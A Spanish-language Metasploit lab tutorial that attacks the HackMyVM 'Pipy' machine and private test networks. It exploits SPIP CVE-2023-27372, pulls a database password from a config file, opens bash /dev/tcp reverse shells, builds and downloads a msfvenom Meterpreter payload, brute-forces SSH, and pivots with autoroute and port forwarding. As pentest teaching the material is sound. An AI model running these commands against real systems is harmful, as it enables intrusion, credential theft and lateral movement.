# 04 Uso de Metasploit Framework

## Índice

1. [Introducción](#1-introducción)
   - [Usos principales](#usos-principales)
   - [Conceptos clave](#conceptos-clave)
2. [Explotación de vulnerabilidades en una máquina objetivo](#2-explotación-de-vulnerabilidades-en-una-máquina-objetivo)
   - [Búsqueda e información del módulo](#21-búsqueda-e-información-del-módulo)
   - [Configuración del exploit](#22-configuración-del-exploit)
   - [Ejecución y post-explotación](#23-ejecución-y-post-explotación)
   - [Estabilización de la shell](#24-estabilización-de-la-shell)
3. [Módulo multi/handler como alternativa a Netcat](#3-módulo-multihandler-como-alternativa-a-netcat)
   - [Reverse shell estándar](#31-reverse-shell-estándar)
   - [Reverse shell Meterpreter con msfvenom](#32-reverse-shell-meterpreter-con-msfvenom)
4. [Ataque de fuerza bruta](#4-ataque-de-fuerza-bruta)
5. [Pivoting en Linux](#5-pivoting-en-linux)
   - [Generación y transferencia del payload](#51-generación-y-transferencia-del-payload)
   - [Configuración del listener](#52-configuración-del-listener)
   - [Reconocimiento de la red interna](#53-reconocimiento-de-la-red-interna)
   - [Autoroute y port forwarding](#54-autoroute-y-port-forwarding)

---

## 1. Introducción

**Metasploit** (oficialmente conocido como **Metasploit Framework**) es una de las plataformas de código abierto más populares y potentes del mundo dedicada a la investigación de seguridad y las pruebas de penetración (pentesting).

Originalmente creado en 2003 y actualmente respaldado por la empresa de ciberseguridad Rapid7, no es simplemente una herramienta, sino un inmenso ecosistema modular que estandariza y automatiza el proceso de descubrir y explotar fallos informáticos.

### Usos principales

- **Pruebas de penetración (Pentesting):** Los profesionales (hackers éticos) lo usan para simular ciberataques reales contra los sistemas, redes y aplicaciones de una organización. El objetivo es encontrar y documentar debilidades antes de que lo hagan los delincuentes.
- **Verificación de vulnerabilidades:** A menudo, los escáneres de seguridad informan de posibles fallos. Metasploit se utiliza para probar si esas vulnerabilidades son reales y qué impacto tendrían si se aprovecharan.
- **Investigación y desarrollo:** Permite a los investigadores de seguridad analizar nuevos fallos y desarrollar estrategias defensivas o firmas para sistemas de detección de intrusos (IDS).

### Conceptos clave

Para entender cómo funciona, es útil conocer su terminología básica:

- **Exploit:** Es el vehículo del ataque. Un fragmento de código diseñado específicamente para aprovechar una vulnerabilidad conocida en un sistema (por ejemplo, un fallo en una versión antigua de Windows) y forzar una entrada.
- **Payload (Carga útil):** Es lo que ocurre *después* de entrar. Es el código que se ejecuta en el sistema objetivo una vez que el exploit ha tenido éxito. Un payload puede servir para crear una puerta trasera, extraer contraseñas o tomar el control remoto completo del equipo (como el famoso payload interactivo llamado *Meterpreter*).
- **Vulnerabilidad:** Debilidad de un sistema que puede ser aprovechada por un exploit para lograr un comportamiento no previsto en un sistema informático.
- **Módulos auxiliares:** Son herramientas incluidas en el framework que no realizan ataques directos, sino que ayudan en las fases de preparación, como escáneres de puertos, rastreadores de redes o ataques de fuerza bruta simples.

---

## 2. Explotación de vulnerabilidades en una máquina objetivo

Se propone explicar el uso de Metasploit mediante las vulnerabilidades de la [máquina Pipy](https://hackmyvm.eu/machines/machine.php?vm=Pipy).

### 2.1 Búsqueda e información del módulo

Lanzamos e inicializamos la base de datos de Metasploit.

```bash
┌──(kali㉿kali)-[~]
└─$ sudo msfdb init && msfconsole
```

Buscamos módulos relacionados con la vulnerabilidad SPIP.

```bash
msf > search cve:2023 SPIP

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/multi/http/spip_rce_form       2023-02-27       excellent  Yes    SPIP form PHP Injection
   1    \_ target: PHP In-Memory             .                .          .      .
   2    \_ target: Unix/Linux Command Shell  .                .          .      .
   3    \_ target: Windows Command Shell     .                .          .      .


Interact with a module by name or index. For example info 3, use 3 or use exploit/multi/http/spip_rce_form
After interacting with a module you can manually set a TARGET with set TARGET 'Windows Command Shell'
```

Consultamos la información detallada del módulo para verificar que es aplicable a la versión instalada.

```bash
msf > info 0

       Name: SPIP form PHP Injection
     Module: exploit/multi/http/spip_rce_form
   Platform: PHP, Unix, Linux, Windows
       Arch: php, cmd
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2023-02-27

Provided by:
  coiffeur
  Laluka
  Julien Voisin
  Valentin Lobstein

Module side effects:
 ioc-in-logs

Module stability:
 crash-safe

Module reliability:
 repeatable-session

Available targets:
      Id  Name
      --  ----
  =>  0   PHP In-Memory
      1   Unix/Linux Command Shell
      2   Windows Command Shell

Check supported:
  Yes

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][..
                                        .]. Supported proxies: sapni, socks4, socks5, socks5h, htt
                                        p
  RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/u
                                        sing-metasploit/basics/using-metasploit.html
  RPORT      80               yes       The target port (TCP)
  SSL        false            no        Negotiate SSL/TLS for outgoing connections
  TARGETURI  /                yes       Path to Spip install
  VHOST                       no        HTTP server virtual host

Payload information:

Description:
  This module exploits a PHP code injection in SPIP. The vulnerability exists in the
  oubli parameter and allows an unauthenticated user to execute arbitrary commands
  with web user privileges. Branches 3.2, 4.0, 4.1 and 4.2 are concerned. Vulnerable versions
  are <3.2.18, <4.0.10, <4.1.18 and <4.2.1.

References:
  https://blog.spip.net/Mise-a-jour-critique-de-securite-sortie-de-SPIP-4-2-1-SPIP-4-1-8-SPIP-4-0-10-et.html
  https://therealcoiffeur.com/c11010
  https://nvd.nist.gov/vuln/detail/CVE-2023-27372


View the full module info with the info -d command.
```

> El módulo permite RCE (Remote Code Execution), corresponde al CVE-2023-27372 y es aplicable a la versión SPIP 4.2.0 que tiene la máquina Pipy.

### 2.2 Configuración del exploit

Cargamos el módulo.

```bash
msf > use exploit/multi/http/spip_rce_form
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf exploit(multi/http/spip_rce_form) >
```

Verificamos las opciones disponibles antes de configurar.

```bash
msf exploit(multi/http/spip_rce_form) > show options

Module options (exploit/multi/http/spip_rce_form):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][.
                                         ..]. Supported proxies: sapni, socks4, socks5, socks5h, h
                                         ttp
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/
                                         using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Path to Spip install
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.100.250  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   ----
   0   PHP In-Memory



View the full module info with the info, or info -d command.
```

Para poder usar el módulo `exploit/multi/http/spip_rce_form` hay que configurar las opciones del exploit para que pueda acceder a la máquina víctima. Las opciones a configurar son:

- **RHOSTS**: Permite indicar el equipo o equipos víctima.
- **RPORT**: Permite indicar el puerto donde se escucha el servicio TCP que corre la máquina Pipy.

Al tratarse de una reverse shell, es decir, el equipo víctima realiza una conexión hacia la máquina del atacante para proporcionar una consola, es necesario configurar un socket TCP en la máquina del atacante para que pueda recibir la conexión:

- **LHOST**: Permite indicar la IP de la máquina atacante.
- **LPORT**: Permite indicar el puerto donde se escucha el servicio TCP que corre la máquina atacante.

El payload `php/meterpreter/reverse_tcp` se encargará de establecer la conexión con la máquina atacante al ser el código que en ella se ejecuta y proporcionar una consola. Con tal fin están configurados el LHOST y LPORT por defecto con los valores `192.168.100.250` y `4444` respectivamente.

> **Nota:** Meterpreter es un payload avanzado que proporciona una consola con múltiples funcionalidades, como la ejecución de comandos, la elevación de privilegios, la captura de pantalla, subir archivos con el comando `upload`, descargar archivos con el comando `download`, entre otros. Esto significa que una shell de tipo Meterpreter proporciona más características y funcionalidades que una shell de tipo bash o powershell.

Establecemos la IP de la máquina víctima y confirmamos la configuración final.

```bash
msf exploit(multi/http/spip_rce_form) > set RHOSTS 192.168.100.6
RHOSTS => 192.168.100.6
msf exploit(multi/http/spip_rce_form) > show options

Module options (exploit/multi/http/spip_rce_form):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][.
                                         ..]. Supported proxies: sapni, socks4, socks5, socks5h, h
                                         ttp
   RHOSTS     192.168.100.6    yes       The target host(s), see https://docs.metasploit.com/docs/
                                         using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Path to Spip install
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.100.250  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   ----
   0   PHP In-Memory



View the full module info with the info, or info -d command.
```

### 2.3 Ejecución y post-explotación

Con los valores configurados, ejecutamos el exploit con el comando `run` o `exploit`.

```bash
msf exploit(multi/http/spip_rce_form) > run
[*] Started reverse TCP handler on 192.168.100.250:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] SPIP Version detected: 4.2.0
[+] The target appears to be vulnerable. The detected SPIP version (4.2.0) is vulnerable.
[*] Got anti-csrf token: iYe2q77AjJpzr7DiCN466DffCNPeUp0xMFqKM8HZ2jA5IWNjp6Vhzoioj1CV4d/wM8wzPYKIJAYCiLEY+fBNfgPHcNshG3+b
[*] 192.168.100.6:80 - Attempting to exploit...
[*] Sending stage (42137 bytes) to 192.168.100.6
[*] Meterpreter session 1 opened (192.168.100.250:4444 -> 192.168.100.6:33192) at 2026-04-22 09:22:27 +0200

meterpreter > getuid
Server username: www-data
meterpreter > pwd
/var/www/html
meterpreter > sysinfo
Computer        : pipy
OS              : Linux pipy 5.15.0-84-generic #93-Ubuntu SMP Tue Sep 5 17:16:10 UTC 2023 x86_64
Architecture    : x64
System Language : C
Meterpreter     : php/linux
```

> **¡Acceso conseguido!** Sesión de Meterpreter abierta en la máquina objetivo con el usuario `www-data`.

Una vez dentro, podemos usar el comando `download` para traer ficheros de la máquina víctima a la atacante y `lcat` para leer su contenido localmente.

```bash
meterpreter > download config/connect.php
[*] Downloading: config/connect.php -> /home/kali/connect.php
[*] Downloaded 243.00 B of 243.00 B (100.0%): config/connect.php -> /home/kali/connect.php
[*] Completed  : config/connect.php -> /home/kali/connect.php
meterpreter > lcat /home/kali/connect.php
<?php
if (!defined("_ECRIRE_INC_VERSION")) return;
defined('_MYSQL_SET_SQL_MODE') || define('_MYSQL_SET_SQL_MODE',true);
$GLOBALS['spip_connect_version'] = 0.8;
spip_connect_db('localhost','','root','dbpassword','spip','mysql', 'spip','','');
```

> **Credenciales obtenidas:** Contraseña de base de datos extraída del fichero de conexión.

El comando `shell` nos permite obtener una línea de comandos estándar del sistema. Para salir de ella, hacemos uso del comando `exit`.

```bash
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
lsb_release -a
Distributor ID: Ubuntu
Description:    Ubuntu 22.04.3 LTS
Release:        22.04
Codename:       jammy
No LSB modules are available.
```

### 2.4 Estabilización de la shell

La shell obtenida a través de `shell` dentro de Meterpreter es básica: al pulsar `Ctrl+Z` se vuelve directamente a la sesión de Meterpreter en lugar de suspenderla al sistema. Para obtener una shell completamente interactiva e independiente, lanzamos una reverse shell desde la propia sesión de Meterpreter hacia un listener en la máquina atacante.

Desde la shell de Meterpreter, redirigimos una bash hacia el puerto 4445 de la máquina atacante:

```bash
meterpreter > shell
Process 1243 created.
Channel 3 created.
bash -c 'bash -i >& /dev/tcp/192.168.100.250/4445 0>&1'
```

En la máquina atacante, recibimos la conexión con Netcat:

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4445
listening on [any] 4445 ...
connect to [192.168.100.250] from (UNKNOWN) [192.168.100.6] 52514
bash: cannot set terminal process group (821): Inappropriate ioctl for device
bash: no job control in this shell
www-data@pipy:/var/www/html$
```

A partir de este punto, convertimos la shell básica en una TTY completamente interactiva:

```bash
# En la shell de www-data — generar una PTY con Python
www-data@pipy:/var/www/html$ python3 -c 'import pty; pty.spawn("/bin/bash")'

# Suspender la shell
www-data@pipy:/var/www/html$ ^Z   # Ctrl+Z

# Ver configuración del terminal local
└─$ stty -a

# Pasar la shell a modo raw y reanudar
└─$ stty raw -echo; fg

# Configurar variables de entorno en la shell remota
www-data@pipy:/var/www/html$ export TERM=xterm
www-data@pipy:/var/www/html$ export SHELL=/bin/bash
www-data@pipy:/var/www/html$ stty rows 54 columns 86
```

---

## 3. Módulo multi/handler como alternativa a Netcat

El módulo `auxiliary/multi/handler` permite interceptar y gestionar múltiples sesiones de Meterpreter o shells estándar que provienen de diferentes exploits o payloads. En lugar de ejecutar un exploit específico, este módulo actúa como un escucha pasivo o activo, listo para recibir cualquier conexión que cumpla con sus parámetros de configuración.

Puede entenderse como una alternativa más potente a Netcat para configurar cómo recibir una conexión por parte de una máquina víctima.

### 3.1 Reverse shell estándar

Cargamos el módulo y revisamos sus opciones por defecto.

```bash
msf > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > show options

Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specifi
                                     ed)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   ----
   0   Wildcard Target



View the full module info with the info, or info -d command.
```

Configuramos la IP de la máquina atacante para recibir la conexión entrante en el puerto 4444.

```bash
msf exploit(multi/handler) > set LHOST 192.168.100.250
LHOST => 192.168.100.250
```

En la máquina objetivo ejecutamos un script de reverse shell que conecte de vuelta a nuestra máquina.

```bash
usuario@debian:~$ cat rs.sh
bash -i >& /dev/tcp/192.168.100.250/4444 0>&1
```

Una vez ejecutado el script en la víctima, el handler recibe la conexión.

```bash
[*] Started reverse TCP handler on 192.168.100.250:4444
[*] Command shell session 2 opened (192.168.100.250:4444 -> 192.168.100.12:36914) at 2026-04-22 14:56:33 +0200

Shell Banner:
_]0;usuario@debian: ~_[01;32musuario@debian_[00m:_[01;34m~_[00m$
-----

usuario@debian:~$
```

### 3.2 Reverse shell Meterpreter con msfvenom

Para obtener una shell Meterpreter en lugar de una shell estándar, primero cambiamos el payload del handler y luego generamos un binario con `msfvenom` que la víctima ejecutará.

Configuramos el payload de Meterpreter en el handler y lo ponemos a escuchar.

```bash
msf exploit(multi/handler) > set PAYLOAD linux/x64/meterpreter/reverse_tcp
PAYLOAD => linux/x64/meterpreter/reverse_tcp
msf exploit(multi/handler) > show options

Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.100.250  yes       The listen address (an interface may be specifi
                                     ed)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   ----
   0   Wildcard Target

View the full module info with the info, or info -d command.

msf exploit(multi/handler) > run
```

Creamos el binario `.elf` en la máquina atacante y lo servimos mediante un servidor HTTP temporal para que la víctima pueda descargarlo.

```bash
┌──(kali㉿kali)-[~]
└─$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.100.250 LPORT=4444 -f elf -b '\x00\x0a\x0d' -o reversa.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes
Saved as: reversa.elf

┌──(kali㉿kali)-[~]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

| Parámetro | Descripción |
|-----------|-------------|
| `-p linux/x64/meterpreter/reverse_tcp` | Payload a empaquetar en el binario |
| `LHOST` | IP de la máquina atacante que recibirá la conexión |
| `LPORT` | Puerto en el que escucha el handler |
| `-f elf` | Formato de salida: binario ELF (Linux) |
| `-b '\x00\x0a\x0d'` | Bytes a evitar (bad chars): nulo, salto de línea y retorno de carro |
| `-o reversa.elf` | Nombre del fichero de salida |

Desde la máquina objetivo, descargamos el binario, le damos permisos de ejecución y lo ejecutamos.

```bash
usuario@debian:~$ wget 192.168.100.250:8000/reversa.elf
--2026-04-22 15:22:47--  http://192.168.100.250:8000/reversa.elf
Conectando con 192.168.100.250:8000... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 250 [application/octet-stream]
Grabando a: «reversa.elf»

reversa.elf         100%[===================>]     250  --.-KB/s    en 0,002s  

2026-04-22 15:22:47 (110 KB/s) - «reversa.elf» guardado [250/250]

usuario@debian:~$ chmod +x reversa.elf
usuario@debian:~$ ./reversa.elf
```

El handler recibe la conexión y abre una sesión Meterpreter en lugar de una shell estándar.

```bash
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.100.250:4444
[*] Sending stage (3090404 bytes) to 192.168.100.12
[*] Meterpreter session 5 opened (192.168.100.250:4444 -> 192.168.100.12:50362) at 2026-04-22 15:27:50 +0200

meterpreter >
```

---

## 4. Ataque de fuerza bruta

Vamos a realizar un ejemplo de ataque de fuerza bruta a un servicio SSH en funcionamiento en una máquina objetivo usando el módulo `auxiliary/scanner/ssh/ssh_login`.

Buscamos el módulo y revisamos sus opciones.

```bash
msf > search ssh_login

Matching Modules
================

   #  Name                             Disclosure Date  Rank    Check  Description
   -  ----                             ---------------  ----    -----  -----------
   0  auxiliary/scanner/ssh/ssh_login  .                normal  No     SSH Login Check Scanner


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/ssh/ssh_login

msf > use 0

msf auxiliary(scanner/ssh/ssh_login) > show options

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   ANONYMOUS_LOGIN   false            yes       Attempt to login with a blank username and password
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   CreateSession     true             no        Create a new session for every successful login
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   DB_SKIP_EXISTING  none             no        Skip existing credentials stored in the current database (Accepted: none, user, user
                                                &realm)
   KEY_PASS                           no        Passphrase for SSH private key(s)
   KEY_PATH                           no        Filename or directory of cleartext private keys. Filenames beginning with a dot, or
                                                ending in ".pub" will be skipped. Duplicate private keys will be ignored.
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   PRIVATE_KEY                        no        The string value of the private key that will be used. If you are using MSFConsole,
                                                this value should be set as file:PRIVATE_KEY_PATH. OpenSSH, RSA, DSA, and ECDSA priv
                                                ate keys are supported.
   RHOSTS                             yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/usi
                                                ng-metasploit.html
   RPORT             22               yes       The target port
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads (max one per host)
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           false            yes       Whether to print output for all attempts


View the full module info with the info, or info -d command.
```

Suponiendo un escenario donde conocemos el usuario `usuario` en la máquina objetivo, configuramos el módulo con el diccionario `rockyou.txt` como lista de contraseñas.

```bash
msf auxiliary(scanner/ssh/ssh_login) > set USERNAME usuario
USERNAME => usuario
msf auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.100.12
RHOSTS => 192.168.100.12
msf auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
PASS_FILE => /usr/share/wordlists/rockyou.txt
```

| Parámetro | Descripción |
|-----------|-------------|
| `USERNAME` | Usuario objetivo del ataque |
| `RHOSTS` | IP de la máquina víctima |
| `PASS_FILE` | Ruta al diccionario de contraseñas |
| `STOP_ON_SUCCESS` | Detiene el ataque en cuanto encuentra una credencial válida (opcional, recomendado) |

Lanzamos el ataque de fuerza bruta.

```bash
msf auxiliary(scanner/ssh/ssh_login) > run
[*] 192.168.100.12:22     - Starting bruteforce
[*] 192.168.100.12:22 SSH - Testing User/Pass combinations
[+] 192.168.100.12:22     - Success: 'usuario:abc123.' 'uid=1000(usuario) gid=1000(usuario) grupos=1000(usuario),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),112(bluetooth),114(lpadmin),117(scanner) Linux debian 6.1.0-40-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.153-1 (2025-09-20) x86_64 GNU/Linux '
[*] SSH session 1 opened (192.168.100.250:34175 -> 192.168.100.12:22) at 2026-04-22 15:53:34 +0200
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

> **Credenciales obtenidas:** usuario `usuario`, contraseña `abc123.` — acceso SSH conseguido y sesión abierta automáticamente.

---

## 5. Pivoting en Linux

El pivoting consiste en usar una máquina comprometida como punto de salto para acceder a redes internas que de otro modo no serían alcanzables desde la máquina atacante. El escenario de este ejemplo es el siguiente:

```
+---------------------------+        +------------------------------------+        +---------------------------+
|     MÁQUINA ATACANTE      |        |       MÁQUINA INTERMEDIA           |        |     MÁQUINA OBJETIVO      |
|        Kali Linux         |        |          Kali Linux                |        |     Kali Linux + Apache   |
|                           |        |                                    |        |                           |
|  eth0: 192.168.100.250/24 |<------>|  eth0: 192.168.100.100/24          |        |  eth0: 192.168.10.20/24   |
|                           |  NAT   |  eth1: 192.168.10.10/24            |<------>|                           |
+---------------------------+        +------------------------------------+  INT   +---------------------------+
        Red NAT                               Red NAT + Red Interna                      Red Interna
   192.168.100.0/24                                                                    192.168.10.0/24
```

La máquina atacante no tiene acceso directo a la red interna (`192.168.10.0/24`). Todo el tráfico hacia la máquina objetivo debe pasar por la máquina intermedia, que actúa como pivote.

### 5.1 Generación y transferencia del payload

Creamos el payload en la máquina atacante y lo exponemos mediante un servidor HTTP para que la máquina intermedia pueda descargarlo.

```bash
┌──(root㉿kali)-[~]
└─# msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.100.250 LPORT=443 -f elf -b '\x00\x0a\x0d' -o reversa.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes
Saved as: reversa.elf

┌──(root㉿kali)-[~]
└─# ls -l reversa.elf                                                                 -rw-rw-r-- 1 root root 250 abr 23 06:39 reversa.elf

┌──(root㉿kali)-[~]
└─# python3 -m http.server 8000                                                       Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Desde la máquina intermedia, descargamos el payload y lo ejecutamos.

```bash
┌──(root㉿kali)-[~]
└─# wget http://192.168.100.250:8000/reversa.elf
--2026-04-23 06:43:26--  http://192.168.100.250:8000/reversa.elf
Conectando con 192.168.100.250:8000... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 250 [application/octet-stream]
Grabando a: «reversa.elf»

reversa.elf                            100%[=========================================================================>]     250  --.-KB/s    en 0s      

2026-04-23 06:43:26 (28,4 MB/s) - «reversa.elf» guardado [250/250]
                                                                                                                                                         
┌──(root㉿kali)-[~]
└─# chmod +x reversa.elf  
                                                                                                                                                         
┌──(root㉿kali)-[~]
└─# ./reversa.elf 
```

### 5.2 Configuración del listener

En la máquina atacante configuramos el módulo `multi/handler` para recibir la conexión de Meterpreter.

```bash
msf > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set PAYLOAD linux/x64/meterpreter/reverse_tcp
PAYLOAD => linux/x64/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST 192.168.100.250
LHOST => 192.168.100.250
msf exploit(multi/handler) > set LPORT 443
LPORT => 443
msf exploit(multi/handler) > run
```

Al ejecutarse el payload en la máquina intermedia, obtenemos la sesión de Meterpreter.

```bash
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.100.250:443
[*] Sending stage (3090404 bytes) to 192.168.100.100
[*] Meterpreter session 4 opened (192.168.100.250:443 -> 192.168.100.100:57802) at 2026-04-23 06:59:44 +0200

meterpreter >
```

> **¡Acceso conseguido!** Sesión de Meterpreter abierta en la máquina intermedia (`192.168.100.100`).

### 5.3 Reconocimiento de la red interna

Con la sesión activa, consultamos las interfaces de red para identificar a qué redes tiene acceso la máquina intermedia.

```bash
meterpreter > ifconfig

Interface  1
============
Name         : lo
Hardware MAC : 00:00:00:00:00:00
MTU          : 65536
Flags        : UP,LOOPBACK
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff::


Interface  2
============
Name         : eth0
Hardware MAC : 08:00:27:81:8a:a6
MTU          : 1500
Flags        : UP,BROADCAST,MULTICAST
IPv4 Address : 192.168.100.100
IPv4 Netmask : 255.255.255.0


Interface  3
============
Name         : eth1
Hardware MAC : 08:00:27:c3:7a:14
MTU          : 1500
Flags        : UP,BROADCAST,MULTICAST
IPv4 Address : 192.168.10.10
IPv4 Netmask : 255.255.255.0
```

> La interfaz `eth1` con la IP `192.168.10.10` conecta la máquina intermedia con la red interna `192.168.10.0/24`.

Para identificar qué máquinas están activas en esa red interna, consultamos la caché ARP y lanzamos un escaneo activo.

```bash
meterpreter > arp

ARP cache
=========

    IP address       MAC address        Interface
    ----------       -----------        ---------
    192.168.10.20    08:00:27:33:2a:51  eth1
    192.168.100.250  08:00:27:8a:35:d2  eth0

meterpreter > shell
Process 32270 created.
Channel 3 created.
arp-scan -I eth1 --localnet
Interface: eth1, type: EN10MB, MAC: 08:00:27:c3:7a:14, IPv4: 192.168.10.10
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.10.20   08:00:27:33:2a:51       PCS Systemtechnik GmbH

1 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.251 seconds (113.73 hosts/sec). 1 responded
exit
meterpreter >
```

> La máquina objetivo se encuentra en `192.168.10.20` dentro de la red interna.

### 5.4 Autoroute y port forwarding

Enviamos la sesión de Meterpreter al background para volver a la consola de Metasploit.

```bash
meterpreter >
Background session 4? [y/N]
msf exploit(multi/handler) > sessions -l

Active sessions
===============

  Id  Name  Type                   Information  Connection
  --  ----  ----                   -----------  ----------
  4         meterpreter x64/linux  root @ kali  192.168.100.250:443 -> 192.168.100.100:57802 (192.168.100.100)

msf exploit(multi/handler) >
```

Para que la máquina atacante pueda enrutar tráfico hacia la red interna a través de la sesión de Meterpreter, usamos el módulo `post/multi/manage/autoroute`.

```bash
msf exploit(multi/handler) > search autoroute

Matching Modules
================

   #  Name                         Disclosure Date  Rank    Check  Description
   -  ----                         ---------------  ----    -----  -----------
   0  post/multi/manage/autoroute  .                normal  No     Multi Manage Network Route via Meterpreter Session


Interact with a module by name or index. For example info 0, use 0 or use post/multi/manage/autoroute

msf exploit(multi/handler) > use 0
msf post(multi/manage/autoroute) > show options

Module options (post/multi/manage/autoroute):

   Name     Current Setting  Required  Description
   -----    ---------------  --------  -----------
   CMD      autoadd          yes       Specify the autoroute command (Accepted: add,
                                        autoadd, print, delete, default)
   NETMASK  255.255.255.0    no        Netmask (IPv4 as "255.255.255.0")
   SESSION                   yes       The session to run this module on
   SUBNET                    no        Subnet (IPv4, for example, 10.10.10.0)


View the full module info with the info, or info -d command.

msf post(multi/manage/autoroute) > set SESSION 4
SESSION => 4
```

Ejecutamos el módulo para añadir las rutas automáticamente.

```bash
msf post(multi/manage/autoroute) > run
[*] Running module against kali (192.168.100.100)
[*] Searching for subnets to autoroute.
[+] Route added to subnet 192.168.10.0/255.255.255.0 from host's routing table.
[+] Route added to subnet 192.168.100.0/255.255.255.0 from host's routing table.
[*] Post module execution completed
msf post(multi/manage/autoroute) >
```

> Las rutas hacia ambas subredes han sido añadidas correctamente. El tráfico desde la máquina atacante hacia `192.168.10.0/24` será enrutado a través de la sesión de Meterpreter.

Por último, configuramos el port forwarding para redirigir el tráfico del puerto 5000 local al puerto 80 de la máquina objetivo. Retomamos la sesión activa y añadimos la regla con `portfwd`.

```bash
msf post(multi/manage/autoroute) > sessions -i 4
[*] Starting interaction with 4...

meterpreter > portfwd add -l 5000 -p 80 -r 192.168.10.20
[*] Forward TCP relay created: (local) :5000 -> (remote) 192.168.10.20:80
```

| Parámetro | Descripción |
|-----------|-------------|
| `-l 5000` | Puerto local en la máquina atacante que recibirá el tráfico |
| `-p 80` | Puerto remoto en la máquina objetivo al que se redirige el tráfico |
| `-r 192.168.10.20` | IP de la máquina objetivo en la red interna |

> El puerto 5000 de la máquina atacante queda mapeado al puerto 80 de la máquina objetivo (`192.168.10.20`). Accediendo a `http://localhost:5000` desde la máquina atacante, se visualiza la web de Apache que corre en la red interna.